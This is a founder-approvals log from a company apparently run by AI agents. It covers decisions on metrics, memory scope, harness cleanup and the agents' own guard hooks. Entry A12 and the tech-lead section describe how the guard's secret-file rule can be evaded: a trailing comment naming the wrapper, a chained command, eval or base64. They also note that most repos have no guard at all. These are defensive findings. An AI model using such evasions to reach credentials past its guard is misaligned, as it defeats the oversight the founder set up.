# APPROVALS — the founder's inbox

`- [ ]` = waiting on you. `- [x]` = decided, with the date. Nothing here stops the company: the
CEO parks the item and takes the next one. The **only** blocking stop is Founder Gate #1 at the
end of Phase 1 (OS §8).

---

## Open — waiting on the founder

*(nothing. A1–A6 were answered on 2026-08-31. Founder Gate #1 lands here when the Phase 1 audit
finishes: the CUT list, the P0 order, and anything the audit finds that only you can decide.)*

---

## Decided

### 2026-08-31 — A1 … A6, answered by the founder
Full record with the founder's own words in [DECISIONS.md](DECISIONS.md); the ones that change how
the company runs became amendments in [AMENDMENTS.md](AMENDMENTS.md).

- [x] **A1 — Company root is `resale-iq/`.** Approved. → AM-6
- [x] **A2 — Stop gate armed.** Approved on condition it caused no issue; the condition was verified
  before arming (loop cold since 2026-08-28, no runner, no cron, no launchd job, lane lock free).
  → AM-4, evidence in `.claude/STOP_GATE_ON`
- [x] **A3 — Adapt the OS to the real stack.** Approved. `OS.md` stays verbatim as your charter;
  every correction lives in `AMENDMENTS.md`, and the constitution is now both files. → AM-1
- [x] **A4 — the uncommitted `demand-intel/api/routes.py`.** Delegated to the CEO, to decide with
  the audit agents. Not forgotten: it will get a written decision in `DECISIONS.md`.
- [x] **A5 — REST API / Order Planner sold on Pro €49 but on the `Hard no` list.** Delegated to the
  CEO to plan. `CLAIMS.md` scopes it; whatever the plan is, changing a price tier or publishing a
  corrected page comes back to you as a gate.
- [x] **A6.1 — Spend cap: €200/month all-in** (infra + Claude together). Red at €160. → AM-2
- [x] **A6.2 — staging vs production database.** Delegated; `DATA.md` answers it. If prod and dev
  are one file, that becomes P0 #1 automatically.
- [x] **A6.3 — sold vs asking prices.** Delegated to the Opus data audit, as you asked.
- [x] **A6.4 — which features have a paying user.** Delegated. Features with no telemetry will be
  reported as **NOT MEASURABLE**, never as zero — the difference decides whether a CUT is evidence
  or a guess.
- [x] **A6.5 — second growth channel.** Delegated. The audit reports which Postiz channels are
  actually connected and recommends one; you connect more only if I ask.
- [x] **A6.6 — Business €99 is cut**, and the `sales` agent is never created. → AM-3
  **One pre-condition holds the removal:** if any customer is currently on that tier, nothing is
  removed until you say what happens to them.

### 2026-08-31 — Phase 0 rails
- [x] Installed and tested under the authority of your bootstrap message (OS §8 Phase 0).
  `.claude/UNLOCK_HARNESS` was used once, for one edit, then removed. Both facts are in
  `SECURITY-LOG.md`.

---

## What still comes back to you no matter what the audit says (OS §0.10)

publish · price change · email users · destructive SQL · scrape rate ↑ · new dependency · KPI
definition change · PII · extension permissions · spend above €200/month · cutting anything a
paying user uses · any edit to hooks / settings / agent files / `OS.md` · acting on an
injection-tripwire hit.

---

## Open — one click, and it unblocks all unattended automation

### A7 — launchd cannot see `~/Desktop`, so nothing can run when no session is open
**RESOLVED 2026-09-01 by option 2, without needing the founder.** The four repos moved to
`~/work/`. `dev.resaleiq.os-verify` now runs hourly with no session open — exit 0, empty
stderr, GREEN. Option (1), the Full Disk Access click, was never needed and is no longer
requested. Kept below for the measurement, which still governs any future path choice:
**no unattended work of any kind may live under `~/Desktop`.**

- [x] Measured, not assumed (`~/Library/Logs/resaleiq/tcc-probe.log`, 2026-09-01): a launchd job
  can **read** a file under `~/Desktop`, but cannot **list a directory** or **execute a script**
  there — `Operation not permitted`. This is the same macOS TCC wall that kept the scrape agent
  dead for 11 days, and it defeats the hourly verifier the same way.

  The job is written and tested; it is **parked, not left firing into a wall**
  (`~/resaleiq-agent/bin/dev.resaleiq.os-verify.plist.pending`). A scheduled job that cannot
  possibly succeed is the thing we just removed twice.

  **Three ways out. The first is one click:**
  1. **System Settings → Privacy & Security → Full Disk Access → `+` → ⌘⇧G → `/bin/bash`.**
     Unblocks every future scheduled job at once.
  2. Move the four repos out of `~/Desktop` (e.g. `~/work/`). No permission needed, ever — but it
     moves everything and breaks every absolute path written this session.
  3. Accept that automation only runs while a session is open. The verifier already runs at
     session start and the report states its own age, so a stale green cannot pass for a current
     one — but nothing checks the company overnight.

  **Recommendation: (1).** It is the click you asked me about yesterday, and it turns out to gate
  far more than the scraper.


---

### A8 — `docs/company/METRICS.md` is written and blocked at the founder gate

**2026-09-01.** `GAPS.md` B1 — *"the single biggest gap"* — is done except for one file that the
rails will not let an agent create.

**What already shipped** (none of it gated, all of it on `main`):

| | |
|---|---|
| `sql/metrics/*.sql` | 7 KPI queries, one file each, all keeping a 5-column contract |
| `scripts/company/metrics.py` | the only thing that executes them; opens every db `mode=ro` |
| `docs/audit/proof/W36/metrics/proof.sh` | **8/8 cold**, incl. a negative control |
| `build_dashboard.py` | runs the queries **inside the production container**, read-only |
| `run_verify.sh` | the hourly job now refreshes the dashboard too (GAPS B9, in part) |

**The first production reading — four UNKNOWN panels are now numbers:**

- **North Star `weekly_trusted_checks` = 0**, n = 1. One trusted check in 7 days; they did not return.
- **`band_coverage` = 59.1 %**, n = 44 — against a §3 target of **≥ 80 %**. Four in ten people who
  ask us something are told we cannot price it. The most actionable number produced this session.
- **`insufficient_data_rate` = 40.9 %**, n = 44.
- **`n_predictions_resolved` = 0 of 340** — C4, at ten times the scale the dev db showed.
- `pipeline_lag_min` = 1.5 min over 1,344 productive runs. Ingestion is healthy.
- `retention_30d` = UNKNOWN, n = 0 — correctly: the oldest account is **28 days old**. It starts
  computing on its own around 2026-09-03.

**What is blocked and why.** `docs/company/METRICS.md` is in `guard.py`'s `PROTECTED` list, because
OS §3 makes a KPI definition a founder gate. The file is written and staged; I did not create
`.claude/UNLOCK_HARNESS` to get around it, because an agent that unlocks its own gate has no gate.

- [x] **Installed 2026-09-01**, on the founder's explicit authorisation in chat. `UNLOCK_HARNESS`
      was created for that single write and **removed immediately after**; the gate is re-armed.
      The three definition decisions below are still open and are the actual founder calls.

**Three definition changes this work forced, which are yours to decide (OS §3: changing a definition
is a founder gate):**

- [ ] **`MAPE ≤ 15 %` must be struck from §3 or redefined.** It is **impossible**, not merely open:
      no ground-truth sold price exists or can exist, and the `is_sold = 1` rows are fabricated.
      Computing it would grade our predictions against fiction.
- [ ] **Split `band_coverage`.** The shipped metric is demand-side (of searches answered, how many
      got a band). §3 arguably means supply-side (of models tracked, how many *could* be priced).
      One name, two questions.

      **CORRECTION to `METRICS.md`, which is wrong on this point and must be amended when you
      decide.** That file says supply-side is blocked on adding `model_stats.comparable_n`. It is
      not blocked at all: the column already exists on **`model_signals`** (I checked the wrong
      table). Measured in production 2026-09-01:

          model_signals            100 rows
          comparable_n >= 8         43        <- supply-side band_coverage = 43%
          comparable_n 3-7          57

      So **43% of the models we track have enough comparables to be priced at all** — against the
      same ≥80% target, and roughly 16 points worse than the demand-side 59.1%. That is a supply
      problem, not a matching problem, and it is arguably the more important of the two numbers.

      I did not ship the query: adding a KPI is the definition change this gate exists to decide.
      Say the word and it is one file.
- [ ] **Accept the North Star as an upper bound, or fix C5 first.** The `n ≥ 8` gate fails open when
      `comparable_n` is absent (`engine/listing_identity.py:50-58`), so today's count is an upper
      bound, not an exact figure.


---

### A9 — the persistent memory directory is outside the rails' SCOPE, so memory does not work

**2026-09-01.** The founder asked whether a memory plugin would improve project memory. The more
useful finding came first: **the memory this session already has is completely blocked.**

`guard.py`'s `SCOPE` allows `~/.claude/projects/-Users-bilalsbaiby-Desktop/memory`. Sessions rooted
at `~/work` write to `-Users-bilalsbaiby-work/memory`, which no SCOPE entry covers. Measured, not
assumed — a real write was attempted and refused:

    BLOCKED by Company OS rails: path outside company scope

Both directories exist on disk. Nothing has been written to the `work` one since the move, and
nothing can be.

This is the **third** instance of the same root cause, which is now a pattern worth naming: SCOPE
was written from the paths the CEO imagined the harness would touch, rather than from what it
actually touches. The first two are recorded in `guard.py`'s own comment — the Desktop
`settings.json` was unreadable, and `~/.claude/plans` blocked the plan describing that very fix.

- [ ] **Add `~/.claude/projects/` to `SCOPE`** (the whole tree, not one project dir, so this does
      not recur the next time the company moves). One line in `.claude/hooks/guard.py` — a
      PROTECTED path, hence a founder gate.

**On the plugins themselves** (`claude-mem`, `task-observer`, `headroom`): none is in this account's
plugin catalog, which returned empty. They are community plugins installed through the `/plugin`
marketplace, an interactive terminal panel not available in this session. **Recommendation: fix A9
first.** A memory plugin layered on a memory directory the rails refuse to write to would fail the
same way, and would be much harder to diagnose from inside a plugin.


---

### A10 — the last of the ECC harness sits behind the rails

**2026-09-01.** `GAPS.md` C2 executed as far as the rails allow, on `demand-intel` branch
`claude/devops/delete-ecc-harness`: **1,156 files → 43, 11M → 408K.** Removed 159 skills, 45
commands, the ECC scripts and `ecc-package.json`.

New evidence, observed rather than argued: those 159 skill descriptions are **injected into context
on any session that touches a demand-intel file**. It is not dormant weight, it is a context tax
paid on every backend task for a harness with no evidence of ever running.

Two directories could not be removed — both are PROTECTED in `guard.py`, and I did not self-unlock:

- [ ] **`demand-intel/.claude/agents/` — 22 ECC agents.** Straightforward delete.

      **I raised a shadowing concern here and then checked it — it was wrong, and the check is the
      point.** I suggested these 22 might shadow the company's 21-agent roster, the `GAPS.md` A1
      failure again. They do not: the two sets share **zero** names (`comm -12` on the two
      directories returns nothing). The ECC set is `architect`, `code-reviewer`, `cs-*`,
      `tdd-guide` — none of which the company roster uses. So they would only ADD 22 unrelated
      agent types in `demand-intel`, never replace `backend-eng` or `tech-lead`.

      That downgrades this from a correctness risk to housekeeping, which is why it is listed last.
- [ ] **`demand-intel/.claude/hooks/`** — includes the no-op `pre:write:gate` whose entire body is
      `echo "[ECC] File write/edit detected" >/dev/null`.

**Kept deliberately, and this one is not a gate — it is a warning:** `.claude/rules/` (3 dirs, 68K).
`HARNESS.md` marks it **MERGE, "do not delete unread"** — the topics overlap `docs/eng/STANDARDS.md`,
which does not exist yet. Deleting it would destroy the only draft of a document we still owe.


---

### A11 — the rails cannot express "only the verifier may write this", so they block everyone

**2026-09-01, found by `verifier` in an independent cold audit**, not by me.

The OS gives `verifier` one exclusive duty: it is the **sole writer** of `docs/company/SCOREBOARD.md`
(OS §7). `guard.py` lists that same path in `PROTECTED`. So the agent the OS appoints to write the
file is the one agent the rails guarantee cannot. The duty and the enforcement contradict.

**The root cause is not a bad rule — it is a missing input, and we have met it before.** A PreToolUse
hook cannot tell which agent is calling it: `CLAUDE_AGENT_NAME` is unset, and the main session and
its subagents share one session id. That is **exactly** `GAPS.md` **A3**, the bug that made all 1,380
activity rows claim to be the CEO's work. The same blind spot has now produced a second, quieter
failure: a rule meaning "only verifier writes here" is not expressible, so it degrades to "nobody
writes here", and the scoring loop in OS §7 has never run.

This is worth deciding rather than patching, because the same limit applies to every
"only agent X may do Y" rule the OS contains.

- [ ] **Pick one:**
      **(a)** Accept it — `verifier` reports its scoreboard to the founder in chat and the file stays
      empty. Cheapest, and OS §7's tier ladder stays decorative.
      **(b)** Un-protect `SCOREBOARD.md` and rely on the doer≠scorer convention rather than the
      rails. Honest about what is actually enforced, and enforces nothing.
      **(c)** Give the hook a real agent identity so the rule can mean what it says — this also
      fixes A3's attribution, which is the reason to prefer it.

**Recommendation: (c)**, and not for the scoreboard's sake. It is the same missing input twice; the
third time will be a rule we trusted more.


---

### A12 — the secret rail can be defeated by a shell comment, and 3 of 4 repos have no rails

**2026-09-01, found by `security-eng` in an independent sweep.** Both items are `guard.py` /
settings changes, so both are PROTECTED-path founder gates. **Neither was tested by exploitation —
found by reading, and deliberately left unproven rather than demonstrated.**

- [ ] **CRITICAL — the `.env` block is a substring check.** `guard.py:131-137` skips the secret
      block when the sanctioned script's filename appears **anywhere in the command text**,
      including in a trailing comment. So a command that reads a live `.env` while merely mentioning
      `with-secrets.sh` in a comment passes unblocked, and the live Stripe key lands in the
      transcript. **Fix: match the invoked executable, not a substring of the command.**

      This is the same defect class as A11: the rails repeatedly test a *string* where they mean a
      *thing*. PROTECTED matches a path substring so it cannot tell your roster from dead ECC files;
      the secret rule matches a command substring so it cannot tell an invocation from a comment.

- [ ] **HIGH — the rails only exist in `resale-iq`.** `demand-intel/.claude/settings.json` is a
      separate file that does not reference `guard.py` at all: no-op hooks, an explicit `cat*` allow,
      no deny list. `resale-iq-growth` has no hooks. `resale-iq-seo` has no `.claude/` directory.
      Each of those repos' own `CLAUDE.md` treats itself as a session home base, so the normal way
      to work on the backend is **unprotected** — including against a push to `main`, which
      `demand-intel/CLAUDE.md` says deploys production.

      Every rail described in `OS-COMPLIANCE.md` §0 as DONE is DONE **in one repo of four.**

- [ ] **MEDIUM, latent — `users.plan` DEFAULT `'operator'`** (`db/schema.py:565`). Two agents
      independently confirmed no live path hits it (registration always writes `'free'`), so this is
      not a current leak. It is a one-omitted-column landmine with no test protecting the invariant.
      **Fix: `DEFAULT 'free'` plus a regression test on the default itself.**


---

### A13 — the one-token change that moves coverage 19 points

**2026-09-01, `data-scientist`, measured against production read-only.** Not a founder gate — a
**P0 for the next engineering session**, recorded here so it is the first thing seen.

`demand-intel/db/queries.py:1986` gates on `MIN_COMPARABLES` (3) where it should gate on
`MIN_VERDICT_COMPARABLES` (8). `prices_30d` is built thirty lines earlier in the same loop and then
**discarded** for any model that found 3 comps in 7 days. So a model with 5 comps at 7d and 11 at
30d is stored as `comparable_n = 5` and refused a price it has the evidence for.

| | now | after |
|---|---|---|
| supply coverage (n=100 models) | 43.0 % | **62.0 %** |
| demand `band_coverage`, all-time (n=180) | 62.8 % | **81.1 %** |
| last 7 days (n=44) | 43.2 % | 65.9 % |

The counterfactual reproduces today's 43.0 % to the decimal on 90/100 models, so it is a
replication rather than a model. **Recommend the 14-day window, not 30**: identical gain today,
half the future staleness, because `sold_observed = 1` only begins 2026-08-21 and the corpus is
11 days deep.

**It also raises honesty, which is the part that matters — but not by the figure first recorded
here.** This entry originally read "median `comparable_n` behind a printed band goes 12 → 26." **That
does not reproduce.** Re-measured against production 2026-09-01 by `data-scientist`
(`docs/company/RELEASE-A13-GATE.md`) under seven population definitions: on this entry's own
definition (demand-weighted, all answered searches, n=180) it is **12 → 13**; supply-weighted it
**falls**, 14 → 12. It is also arithmetically unreachable — the 22 models this change admits have a
median `comparable_n` of 10, so adding them to a 113-search population with median 12 cannot produce
26. **The right argument is the floor, not the median:** widening the window crosses the `≥ 8` floor
by finding evidence a model already had (e.g. a model at 5 comps on the 7-day read clears 11 on 30
days), whereas cutting the threshold to 5 prints prices computed from as few as 5 comparables. Same
coverage number, opposite mechanism.
**Do not cut the threshold. 8 is right — on the floor argument.**

**Two flags from the same analysis:**

- **The real ceiling is the labeller, not the constants.** Only **7,247 of 103,993** observed sales
  (7.0 %) carry a `model` label; 11.8M of 12.7M listings have a brand and no model. No constant
  fixes that.
- Coverage will drift upward on its own until ~2026-09-20 as the corpus deepens, so any goal set on
  it needs a calendar control or it will score a win that time delivered.


---

### A8 / A12 — CONSULTATION IN PROGRESS (founder authorised, conditional)

**2026-09-01.** The founder authorised A8 and A12 **on the condition that every agent with an
informed opinion is consulted first**. Consultation is open with data-scientist, security-eng,
tech-lead, product-manager, devops and verifier. Recorded as it lands, dissent included.

#### `verifier` — DISSENTS on proceeding tonight as stated

| Item | Verdict |
|---|---|
| **A8-1 strike MAPE** | **SAFE.** No `sql/metrics/mape.sql` was ever written, so there is no baseline to break. Removing a KPI that was never measured costs nothing |
| **A8-2 `band_coverage` split** | **SERIES BREAK REQUIRED.** `band_coverage.sql` is live and will be scored; redefining it makes before/after incomparable |
| **A8-3 North Star exact after C5** | **SERIES BREAK REQUIRED**, same reason |
| **A12** | **Do not ratify as stated — it overstates what the proof verified** |

**It corrected my unifying diagnosis, and it is right.** I claimed the SCOREBOARD block and the
credential-file bypass were one root cause ("the rails match strings where they mean things"). They
are not:

- SCOREBOARD is a **missing-information** problem — guard.py identifies the path perfectly well and
  simply has no caller identity with which to apply an exception.
- The credential-file bypass is an **encoding** problem — the match is too loose.

They share an architecture (policy by string-matching on external facts, with no context-dependent
rules) but need **different fixes**, and treating them as one would produce a fix for neither.

**Then it turned the audit on itself, which is the finding of the night.** Its own cold run searched
`resale-iq/docs/audit/proof` and nowhere else:

> *"The proof passed while testing one quarter of its subject. That is exactly the failure mode I
> exist to catch."*

- [ ] **Correct `OS-COMPLIANCE.md`**: Phase 0 rails go from **DONE (40/40)** to **PARTIAL —
      resale-iq only (40/40); demand-intel, growth, seo unverified.**
- [ ] **Extend the Phase-0 proof to all four repos** — assert guard.py is present and wired, that
      each PROTECTED tuple covers the critical paths, and that the deny rules and their negative
      controls fire identically in each. Then re-run: it either still passes, or it fails and
      surfaces the missing rails. Both outcomes are useful; the current state is not.
- [ ] **A new suite asserting `demand-intel` cannot push `main` without hitting a rail**, because
      that push is the production deploy.

**Following its recommendation rather than my original plan:** ratify A8 *with* the two series-break
markers; do **not** ratify A12 until the rail audit covers all four repos and OS-COMPLIANCE is
corrected.

---

#### A NEW DEFECT, found by trying to write this file

Committing the paragraph above was **blocked by the rails**, because the commit message contained
the literal name of the credential file while explaining the bug. The secret rule matches that
string anywhere in a command and cannot tell *reading* a secret from *writing about the rule*.

So the defect has both faces:
- **false negative** — a trailing shell comment naming the sanctioned wrapper defeats the block
  (security-eng, CRITICAL);
- **false positive** — documenting the rule trips it, which is how a rail teaches people to route
  around it.

- [ ] Any fix must be verified against **both** directions. A tightened match that still fires on
      prose is only half repaired.


#### `product-manager` — AGREES on all three, with one condition that changes A8-2

| Item | Verdict |
|---|---|
| **A8-1 strike MAPE** | **AGREE, no reservation.** "There is no version of wait-and-see that makes this different later — the data simply is not collectable off Vinted's public surface" |
| **A8-2 the split** | **AGREE the SHAPE. HOLD the demand-side VALUE.** Approve supply-side shipping as its own named metric; do **not** publish 59.1% / 40.9% as the demand-side's canonical first reading |
| **A8-3 North Star exact** | **AGREE, strictly conditional.** Correct *by construction* the moment C5 merges. **Gate the copy change on the merge commit, not on tonight's authorisation** — "exact" applied before the merge is a false claim of precision, worse than the caveat it replaces |

**The condition, and it is the right one:** formalising the demand-side definition tonight with a
reading we now know is contaminated would mean *the founder's first act under this new authority is
ratifying a number already known to be wrong at the moment of ratification.*

**It then corrected its own roadmap, unprompted.** It had called 59.1% "the single most actionable
number in the file" — quoting `METRICS.md`, i.e. quoting me. Its retraction:

> *"It isn't a number yet; it's an instrument reading its own testing signal."*

Its §4 conclusion survives on independent evidence — the 19% quota-wall rate is measured over ALL
requests, and `DATA.md` §6.3's catalog ceiling is derived from production totals with no query-log
dependency. The conclusion holds; the figure used to illustrate it does not.

- [ ] **New, for `data-scientist`:** exclude known probe/internal IPs from every demand-side metric
      before it is cited again, and report `n` as deduplicated real sessions rather than raw rows.
- [ ] **ROADMAP.md baseline** for `band_coverage` / `insufficient_data_rate` becomes
      **UNKNOWN-pending-probe-filter**, per OS §0 rule 2. A number known to be contaminated does not
      get to stand as the baseline merely because it was measured first.

**On A13 (the one-token fix):** does not displace the branch — both are P0, neither substitutes for
the other (one is a wrong-*answer* bug, the other a wrong-*denominator* bug). But **review them in
the SAME pass, not sequentially**: both touch "how many comparables justify a band", and someone must
confirm the changed 30-day windowing does not interact with C5's `comparable_n` check before either
is called done. And re-verify the 81.1% was not computed over the same contaminated population
before anyone reports the ≥80% target as met.

---

### Where A8 stands after two independent consultations

Both agents converge, from different directions:

- **A8-1 — RATIFY.** Safe on both readings: no baseline exists to break, and no future data can
  rescue it.
- **A8-2 — RATIFY THE STRUCTURE ONLY.** Supply-side ships as its own named metric. The demand-side
  value is held at UNKNOWN pending the probe filter, and carries a series-break marker.
- **A8-3 — RATIFY, GATED ON THE MERGE COMMIT.** Not on tonight's authorisation.


#### `tech-lead` — REFUTES A8-3, and rewrites the A12 architecture

**A8-3 is wrong as I stated it. C5 removes ONE over-count and leaves a second untouched.**

`said_buy_below` records what was **computed**, not what was **delivered**:

- `api/routes.py:1080` / `:1220` — `await _log_recap(result)` runs, then `return await _gate(result)`.
  The recap is logged from the **pre-gate** payload.
- `api/routes.py:916-923` → `db/queries.py:2742-2745` writes `said_buy_below` from that payload.
- `api/routes.py:1006-1010` — for a logged-in **FREE** user, `_gate` returns a fresh dict with
  `"locked": True` and `buy_below` among `locked_fields`. **The user never receives the band.**

So every logged-in free check that *computed* a band writes a non-NULL `said_buy_below` and is
counted by `weekly_trusted_checks.sql`. OS §3 says "checks that **returned** a band with n ≥ 8 **to
a user**". A paywalled teaser did not return a band to that user.

After C5 the metric means *"checks for which we computed an n≥8 band for a logged-in user, whether
or not they were shown it."* Defensible; **not the §3 definition; still an upper bound.** Calling it
exact would be the same over-confidence as the C6 blocker, one layer up.

- [ ] **A THIRD A8 question nobody had asked:** log post-gate, or amend the SQL to exclude locked
      deliveries. Either is a definition change, so it belongs in this gate.
- [ ] **Do not write C5 up as a KPI improvement.** At n=1 it is a correctness fix with no measurable
      effect. The honest line: "the fail-open caveat is removed; the number was and remains 0 at n=1."
- [ ] **What is owed is a DISCONTINUITY MARKER, not a redefinition** — a dated entry carrying the
      pre-C5 reading with its `n`, the merge SHA, and the first post-C5 reading with its `n`.
      Nothing in the definition moves; the BASELINE moves. Filing a baseline discontinuity as a
      definition change would corrupt the very property this gate protects.

**A12 — one symptom, THREE causes, three different fixabilities.** Shipping them as one fix "will
produce a SECURITY-LOG entry that overstates what was repaired."

| # | Cause | Fixability |
|---|---|---|
| 1 | `PROTECTED` matches a relative path fragment (`guard.py:105-106`) when it means specific absolute files | **Mechanical.** Make it absolute, rooted at the `ROOT` guard.py already hardcodes |
| 2 | The credential-file command rule | **Not soundly fixable here.** Shell is not decidable by substring |
| 3 | No agent identity | **Not a matching bug at all** — a missing platform capability |

**THE TRAP IN MY OWN PROPOSED FIX, which is exactly why this needed a reviewer:** today
`demand-intel/.claude/settings.json` is protected *by accident*, through the same substring
sloppiness. **Make `PROTECTED` absolute and you silently UNPROTECT it.** The other repos' settings
files must be added explicitly in the same change or the fix is a net regression.

**On (2):** the realistic bypass is worse than a trailing comment — a `--names` call chained with
`&&` to a plain read defeats it too, and that is a shape an agent could type innocently. Tightening
the match does not make it sound: `eval`, `$(...)`, base64, a variable holding the path.
`guard.py:196-197` already confesses this for heredocs — *"KNOWN LIMIT … Recorded rather than
pretended away"* — and it generalises. **The refined lesson, better than mine:** *the tool schema
hands you a referent for structured tools and a string for Bash; enforce boundaries only where you
get a referent.* `check_paths` reads `tool_input.file_path` and is genuinely sound. Fix the bypass
by requiring the wrapper in **command position**, and write into STANDARDS that this rule is
defence-in-depth, not a boundary.

**On (3) — the fix is already in our own codebase, four lines above the bug.** `guard.py:33-37`:
*"Generated from check output. A hand-written status is precisely the drift these files exist to
prevent, so nobody gets to type into them."*

**GENERATE, DON'T GATE.** Apply it to `SCOREBOARD.md`: block writes for **everyone including
verifier**, have verifier emit a run artefact, generate the file, and fail a check if the committed
file does not match a regeneration. That delivers what OS §7 actually wants — *"SCOREBOARD content
is derived from verified runs"* — which is **stronger** than "verifier typed it", and it is
enforceable with the capabilities we have. **A11 is re-scoped to this.**

**Cross-repo:** do not copy guard.py four times; four copies drift, and demand-intel's settings file
is what drift looks like. Each repo needs an absolute-path `PreToolUse` entry. That file is not
merely a no-op — its `permissions.allow` grants broad `Bash` reads with **no deny list**, so a
session rooted there is *worse than unguarded*. **Reduce it; do not augment it.** Scope note:
sessions rooted in resale-iq (AM-6) never load it, so this is a latent hazard for manual sessions,
not an active one for the roster.

**Ordering, four separate commits, one PR each:** (1) absolute PROTECTED + explicitly add the other
repos' settings files → (2) demand-intel settings reduced and pointed at guard.py → (3) wrapper
match moved to command position + the honesty line in STANDARDS → (4) SCOREBOARD generated.


#### `data-scientist` — the decisive verdict. Agrees on all three, and attaches a condition to each.

**A8-1 MAPE — STRIKE, confirmed on production.** `is_sold=1` is 5,436,711 rows; only 104,052 are
`sold_observed=1`. **98.09%** never observed departing. And `db/queries.py:285-292` is explicit that
the honest column means *"we held this row as active and now it is gone"* — departure, not sale.
Departure also covers delisting, seller removal, an offline sale at another price, and a relist.
**There is no sale price in this system and no path to one.**

**But striking MAPE exposes a hole I had not seen.** OS §0.4: no KPI without its counter. The
Insight counter is `n_predictions_resolved` — **dead, 0 of 340**. And its own KPI card names
`insufficient_data_rate` as the counter to `band_coverage`, which is **mathematically incapable of
the job**: they are exact complements by construction. *"My counter-KPI cannot ever contradict my
primary. That is a real defect in the card I was issued, and I would rather say so than carry it."*

- [ ] **CONDITION: adopt `band_evidence_p50` in the SAME gate** — the median `comparable_n` behind a
      band we actually printed. Measured tonight, n=180 answered searches:

      | arm | bands printed | median evidence |
      |---|---:|---:|
      | today | 113 | **12** |
      | A13 (widen the window) | 146 | **13** (corrected) |
      | lower threshold to 5 | 144 | UNKNOWN (unverified) |

      > **Correction, 2026-09-01 (`data-scientist`, `docs/company/RELEASE-A13-GATE.md`):** this table
      > originally read **26** for the A13 row and **10** for the lower-threshold row. **26 does not
      > reproduce** under any of seven re-measured population definitions against production; on this
      > table's own definition it is **12 → 13**, and supply-weighted the median **falls**, 14 → 12.
      > It was also arithmetically unreachable (A13's 22 newly-admitted models have median
      > `comparable_n` = 10; adding them to a 113-search population with median 12 cannot produce 26).
      > **`band_evidence_p50` therefore does NOT move the right way for A13** — it is a descriptive
      > statistic that falls under an honest widening, and per the corrected KPI card it must never be
      > registered as A13's counter (superseded below, A8-3 revision). The lower-threshold row's "10"
      > was not independently re-verified and is shown as UNKNOWN rather than repeated.

      **This paragraph's original claim — that the counter moves the RIGHT way for A13 and the WRONG
      way for the threshold-5 alternative — is retracted along with the numbers it was built on.**
      `band_coverage` moved 19pp with no working honesty counter validated behind it; the real
      argument for A13 over the threshold cut is the evidence **floor** each one crosses or lowers,
      not this median (see A13 entry above and `docs/audit/COVERAGE.md` §4.2).

- [ ] Park **`band_asking_error_p50`** as a named candidate — median |published − outcome|/outcome
      over a **strictly disjoint** forward window, median not mean, the word *asking* permanent, never
      public. **Do not commission it this cycle:** building a second-order accuracy instrument before
      the first-order one has produced a single row is out of order.

**A8-2 — agree on the split; my removal mechanism was wrong.**

- [ ] **Rename the survivor to `band_coverage_demand`.** With two metrics live, the bare name
      silently resolves to one of them — a trap sprung by whoever reads the dashboard at speed. The
      metrics layer shipped 2026-09-01, so there is no history to break. **Do it now or never.**
- [ ] **Do NOT remove the demand-side panel.** *"Removing an instrument because its current reading
      is unreliable is how you lose the instrument permanently, and how you stop noticing the day it
      becomes reliable."* Instead add a **pre-registered minimum-`n` floor to the metric contract** —
      an extension of the rule already in `sql/metrics/README.md` that `n=0` is UNKNOWN rather than
      zero. A population of 44 with 4 probes in it has not measured a rate either.
      **Floor = 100 for a proportion, derived not chosen:** at p≈0.8 the 95% half-width is
      1.96·√(p(1−p)/n) — n=44 gives **±14.5pp**, which cannot distinguish 45% from 72%; n=100 gives
      ±8pp. This produces exactly the outcome I wanted, **by a rule instead of by fiat.**
- [ ] **The floor is a CONTRACT rule, not a `band_coverage` rule.** The dashboard currently publishes
      `trial_to_paid = 0.0%` at **n=1** and `weekly_trusted_checks = 0` at **n=1**. *"Blanking a
      metric at n=44 while publishing 0.0% at n=1 two panels above would look like we blank the
      numbers we dislike."*
- [ ] **Tag the probe traffic separately** — the floor does not fix contamination. At n=1000 the
      metric is still wrong if our own probes are in the denominator.
- [ ] **Definitions land BEFORE A13**, and A13 registers against **`band_coverage_supply`** (n=100,
      above the floor, and the thing A13 mechanically moves) with `band_evidence_p50` as its counter.
- [ ] **Calendar control required:** the observed-sales corpus is 11 days deep (`MIN(sold_at)` =
      2026-08-21), so supply coverage drifts upward on its own until ~2026-09-20 with or without A13.
      Without a control the verifier scores a HIT the clock produced.

**A8-3 — "it does not answer itself." A THIRD independent reason, distinct from `tech-lead`'s.**

`said_buy_below IS NOT NULL` is a **two-hop structural inference** held together by a comment. And
the thread is thinner than the comment implies: `db/queries.py:2062` gates `max_buy_price` on
`MIN_COMPARABLES` (**3**), not 8 — all 100 board rows have a non-null `max_buy_price`, including the
24 at `comparable_n = 3`. **The only thing enforcing 8 is a single early return at
`api/routes.py:889`.** Non-null `said_buy_below` is not evidence of n≥8; it is evidence that one
`return` did not fire. That invariant class is *already broken twice in this same table* (C9), and
`comparable_n` oscillates across 8 between analyzer runs.

- [ ] **Delete the "upper bound" wording** (it names a bias that will no longer exist) and replace it
      with one honest line: *"`n ≥ 8` is inferred from `said_buy_below`, not read from a stored
      `comparable_n`."* **Do not write "exact count."**
- [ ] **Close it properly:** `ALTER TABLE verdict_logs ADD COLUMN comparable_n INTEGER`, written at
      `api/routes.py:891` where `n_comp` is already in a local variable, plus a regression test
      asserting `said_buy_below IS NOT NULL ⟹ comparable_n >= 8`. Fold into the same migration as the
      probe tag.
- **Keep it in proportion:** exactly **one row** in the entire history of `verdict_logs` has
  `said_buy_below IS NOT NULL`. This is a debate about a single row.

**Explicit "do NOT" list:** do not report any successor against a sold price; do not strike MAPE
without adopting `band_evidence_p50`; do not remove the demand panel; do not apply the floor to one
metric only; do not put definitions and A13 in one PR; **do not touch `MIN_VERDICT_COMPARABLES`** —
threshold 5 reaches 80.0% vs A13's 81.1% by dropping the floor to 5 comparables (not, as recorded
here 2026-08-31, "by dropping median evidence 12→10" — that figure was never independently verified
and the paired 12→26 claim it was built alongside does not reproduce; struck 2026-09-01, see A13
entry above).

---

## A8 — RATIFIED. Four consultations, and the plan they produced is not the plan I proposed.

| Item | Decision |
|---|---|
| **A8-1** | **STRIKE MAPE**, and adopt `band_evidence_p50` as the honesty counter in the same gate |
| **A8-2** | Split confirmed. Rename to **`band_coverage_demand`**. Add an **n-floor to the contract, all metrics**. Tag probe traffic. Definitions before A13 |
| **A8-3** | **Delete "upper bound". Do NOT write "exact."** Three independent over-counts remain: the delivered-vs-computed gap (`tech-lead`), the two-hop inference (`data-scientist`), and oscillation across the threshold |

Every one of those differs from what I put to the agents. The consultation was not a formality.


#### A12 — `security-eng` and `devops` consulted. **They disagree on mechanism**, and both were partly right.

